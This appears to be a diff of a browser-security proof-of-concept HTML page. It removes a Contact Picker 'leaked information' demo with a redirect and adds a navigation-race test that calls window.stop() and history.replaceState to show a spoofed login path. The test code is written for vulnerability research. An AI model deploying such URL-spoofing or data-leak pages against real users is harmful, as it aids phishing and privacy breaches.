@@ -1,29 +1,39 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <title>PoC</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-
-    <script>
-        async function runPoC() {
-            let contacts = await navigator.contacts.select(["name"], {});
-
-            document.body.innerHTML = `
-                <h1>
-                    <font color="red">Leaked information:</font> ${contacts[0]["name"]}
-                </h1>
-            `;
-
-            // Meta refresh redirect
-            let meta = document.createElement("meta");
-            meta.httpEquiv = "refresh";
-            meta.content = "2;url=https://www.jody.com";
-            document.head.appendChild(meta);
-        }
-    </script>
-</head>
-<body>
-    <button onclick="runPoC()">Click Me</button>
-</body>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC: Navigation Race + replaceState</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 1rem; }
+  iframe { width: 100%; height: 70vh; border: 1px solid #ccc; }
+  code { background: #f4f4f4; padding: .1rem .3rem; border-radius: 4px; }
+</style>
+<h1>Navigation race test</h1>
+<p>This does not prove a vulnerability by itself. It checks whether URL display/state gets stale during rapid stop+history updates.</p>
+<label>Victim URL: <input id="victim" size="42" value="https://example.com"></label>
+<label>Spoof path: <input id="spoof" size="42" value="/accounts/google/login"></label>
+<button id="run">Run race</button>
+<pre id="log"></pre>
+<iframe id="f" sandbox="allow-scripts allow-same-origin"></iframe>
+<script>
+const log = (m) => document.getElementById('log').textContent += m + "\n";
+document.getElementById('run').onclick = () => {
+  const victim = document.getElementById('victim').value;
+  const spoof = document.getElementById('spoof').value;
+  history.replaceState({}, '', '/start');
+  const f = document.getElementById('f');
+  f.src = victim;
+  log('navigate iframe -> ' + victim);
+  setTimeout(() => {
+    try {
+      window.stop();
+      history.replaceState({}, '', spoof);
+      log('window.stop() + history.replaceState(' + spoof + ')');
+      log('current top URL=' + location.href);
+    } catch (e) {
+      log('error=' + String(e));
+    }
+  }, 120);
+};
+</script>
 </html>
